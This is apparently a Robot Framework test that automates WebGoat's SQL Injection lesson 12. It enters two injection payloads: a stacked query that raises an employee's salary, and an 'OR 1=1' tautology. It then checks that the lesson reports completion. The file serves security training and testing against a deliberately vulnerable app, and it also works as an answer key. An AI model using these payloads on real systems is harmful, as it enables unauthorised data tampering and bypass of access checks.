*** Settings ***
Library        Browser
Library        OperatingSystem
Resource       ${EXECDIR}${/}resources${/}keywords${/}webgoat_keywords.robot

*** Test Cases ***
Test SQL Injection 12
    [Documentation]            Test case for SQL Injection task 12 in WebGoat.
    Open and Log In to Webgoat
    Click                      text="(A3) Injection"
    Click                      text="SQL Injection (intro)"
    Click                      xpath=//*[@id="restart-lesson-button"]
    Click                      text="12"

    ${input_login}=            Get Element        xpath=${WEBGOAT_SLCTRS_12}1]/td[2]/input
    Fill Text                  ${input_login}     Smith '; update employees set salary = 100000 where last_name='Smith' --
    ${input_userid}=           Get Element        xpath=${WEBGOAT_SLCTRS_12}2]/td[2]/input
    Fill Text                  ${input_userid}    1' OR '1'='1
    Click                      xpath=${WEBGOAT_SLCTRS_12}3]/td/button
    
    Wait For Elements State    (${WEBGOAT_FEEDBACK})[8]    visible    timeout=5s
    ${feedback}=               Get Text           (${WEBGOAT_FEEDBACK})[8]
    Should Contain             ${feedback}        done
    Close Browser
